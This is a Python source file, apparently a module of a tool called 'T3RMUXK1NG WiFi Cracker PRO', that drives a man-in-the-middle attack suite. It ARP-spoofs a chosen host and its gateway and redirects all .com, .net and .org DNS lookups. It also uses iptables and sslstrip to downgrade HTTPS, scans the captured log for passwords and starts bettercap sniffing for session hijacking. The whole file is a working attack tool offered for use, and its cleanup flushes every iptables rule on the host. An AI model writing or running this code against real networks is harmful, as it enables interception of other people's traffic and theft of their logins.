#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
T3RMUXK1NG WiFi Cracker PRO - MITM Attack Module
Man-in-the-Middle attack suite
"""

import os
import re
import time
import subprocess
import threading
import queue
from typing import Dict, List, Optional
from dataclasses import dataclass
from datetime import datetime


@dataclass
class InterceptedData:
    """Intercepted data structure"""
    type: str  # http, https, dns, credentials, etc.
    source: str
    destination: str
    content: str
    timestamp: str = ""
    
    def to_dict(self) -> Dict:
        return {
            'type': self.type,
            'source': self.source,
            'destination': self.destination,
            'content': self.content,
            'timestamp': self.timestamp or datetime.now().isoformat()
        }


class MITMAttacker:
    """Man-in-the-Middle Attack Engine"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.target = None
        self.processes = []
        self.intercept_queue = queue.Queue()
        self.intercepted: List[InterceptedData] = []
        self.stats = {
            'packets_intercepted': 0,
            'credentials_captured': 0,
            'sessions_hijacked': 0
        }
    
    def start(self, target, attack_type: str = "arp") -> bool:
        """Start MITM attack"""
        self.target = target
        self.running = True
        
        if attack_type == "arp":
            return self._arp_spoof()
        elif attack_type == "dns":
            return self._dns_spoof()
        elif attack_type == "sslstrip":
            return self._sslstrip()
        elif attack_type == "session":
            return self._session_hijack()
        elif attack_type == "creds":
            return self._credential_harvest()
        elif attack_type == "full":
            return self._full_suite()
        
        return False
    
    def _arp_spoof(self) -> bool:
        """ARP spoofing attack"""
        try:
            # Get gateway IP
            gateway = self._get_gateway()
            target_ip = self._get_target_ip()
            
            if not gateway or not target_ip:
                return False
            
            # Enable IP forwarding
            self._enable_forwarding()
            
            # Start arpspoof
            cmd = ['arpspoof', '-i', self.interface, '-t', target_ip, gateway]
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.processes.append(process)
            
            # Bidirectional spoof
            cmd = ['arpspoof', '-i', self.interface, '-t', gateway, target_ip]
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.processes.append(process)
            
            return True
            
        except FileNotFoundError:
            # Try alternative: bettercap
            return self._bettercap_mitm()
        except Exception as e:
            return False
    
    def _dns_spoof(self) -> bool:
        """DNS spoofing attack"""
        try:
            # Create hosts file for dnsspoof
            hosts_file = '/tmp/dns_spoof_hosts'
            with open(hosts_file, 'w') as f:
                f.write('10.0.0.1 *.com\n')
                f.write('10.0.0.1 *.net\n')
                f.write('10.0.0.1 *.org\n')
            
            # Start ARP spoof first
            self._arp_spoof()
            
            # Start dnsspoof
            cmd = ['dnsspoof', '-i', self.interface, '-f', hosts_file]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            self.processes.append(process)
            
            def monitor():
                while self.running:
                    line = process.stdout.readline()
                    if line:
                        self.intercept_queue.put(InterceptedData(
                            type='dns',
                            source='',
                            destination='',
                            content=line.strip()
                        ))
            
            threading.Thread(target=monitor, daemon=True).start()
            
            return True
            
        except FileNotFoundError:
            return False
        except Exception:
            return False
    
    def _sslstrip(self) -> bool:
        """SSL stripping attack"""
        try:
            # Enable IP forwarding
            self._enable_forwarding()
            
            # Start ARP spoof
            self._arp_spoof()
            
            # Configure iptables for SSL strip
            subprocess.run(
                f'sudo iptables -t nat -A PREROUTING -i {self.interface} -p tcp --dport 80 -j REDIRECT --to-port 8080',
                shell=True, capture_output=True
            )
            
            # Start sslstrip
            cmd = ['sslstrip', '-l', '8080', '-w', '/tmp/sslstrip.log']
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.processes.append(process)
            
            # Monitor log file
            def monitor_log():
                last_size = 0
                while self.running:
                    try:
                        if os.path.exists('/tmp/sslstrip.log'):
                            size = os.path.getsize('/tmp/sslstrip.log')
                            if size > last_size:
                                with open('/tmp/sslstrip.log', 'r') as f:
                                    f.seek(last_size)
                                    new_content = f.read()
                                    last_size = size
                                    
                                    # Parse for credentials
                                    if 'password' in new_content.lower() or 'pass' in new_content.lower():
                                        self.intercept_queue.put(InterceptedData(
                                            type='credentials',
                                            source='',
                                            destination='',
                                            content=new_content
                                        ))
                                        self.stats['credentials_captured'] += 1
                    except:
                        pass
                    time.sleep(1)
            
            threading.Thread(target=monitor_log, daemon=True).start()
            
            return True
            
        except FileNotFoundError:
            return False
        except Exception:
            return False
    
    def _session_hijack(self) -> bool:
        """Session hijacking"""
        try:
            # Use bettercap for session hijacking
            cmd = ['bettercap', '-iface', self.interface]
            process = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            
            # Send bettercap commands
            commands = '''
set arp.spoof.targets {target}
arp.spoof on
net.sniff on
'''
            process.stdin.write(commands)
            process.stdin.flush()
            
            self.processes.append(process)
            
            return True
            
        except FileNotFoundError:
            return False
        except Exception:
            return False
    
    def _credential_harvest(self) -> bool:
        """Credential harvesting"""
        # Start SSL strip + log parsing
        return self._sslstrip()
    
    def _full_suite(self) -> bool:
        """Full MITM suite"""
        success = True
        
        if not self._arp_spoof():
            success = False
        
        if not self._dns_spoof():
            pass  # Non-critical
        
        if not self._sslstrip():
            pass  # Non-critical
        
        return success
    
    def _bettercap_mitm(self) -> bool:
        """Use bettercap for MITM"""
        try:
            target_ip = self._get_target_ip()
            
            cmd = ['bettercap', '-iface', self.interface]
            process = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
            
            commands = f'''
set arp.spoof.targets {target_ip}
arp.spoof on
net.sniff on
'''
            process.stdin.write(commands)
            process.stdin.flush()
            
            self.processes.append(process)
            
            return True
            
        except FileNotFoundError:
            return False
        except Exception:
            return False
    
    def _get_gateway(self) -> Optional[str]:
        """Get default gateway IP"""
        try:
            result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'default' in line:
                    return line.split()[2]
        except:
            pass
        return None
    
    def _get_target_ip(self) -> Optional[str]:
        """Get target IP"""
        if self.target and hasattr(self.target, 'ip'):
            return self.target.ip
        
        # Try to get first client
        try:
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'ether' in line.lower():
                    parts = line.split()
                    for part in parts:
                        if re.match(r'\d+\.\d+\.\d+\.\d+', part):
                            return part
        except:
            pass
        
        return None
    
    def _enable_forwarding(self):
        """Enable IP forwarding"""
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')
        except:
            pass
    
    def _disable_forwarding(self):
        """Disable IP forwarding"""
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('0')
        except:
            pass
    
    def get_intercepted(self) -> Optional[InterceptedData]:
        """Get intercepted data (non-blocking)"""
        try:
            return self.intercept_queue.get_nowait()
        except queue.Empty:
            return None
    
    def get_all_intercepted(self) -> List[InterceptedData]:
        """Get all intercepted data"""
        return self.intercepted.copy()
    
    def stop(self):
        """Stop MITM attack"""
        self.running = False
        
        # Stop all processes
        for process in self.processes:
            try:
                process.terminate()
            except:
                pass
        
        # Clean up iptables
        subprocess.run('sudo iptables -F', shell=True, capture_output=True)
        subprocess.run('sudo iptables -t nat -F', shell=True, capture_output=True)
        
        # Disable forwarding
        self._disable_forwarding()
        
        # Clean up temp files
        for f in ['/tmp/sslstrip.log', '/tmp/dns_spoof_hosts']:
            try:
                os.remove(f)
            except:
                pass
    
    def get_stats(self) -> Dict:
        """Get attack statistics"""
        return self.stats.copy()


if __name__ == '__main__':
    print("MITM Attack Module - Use via main application")
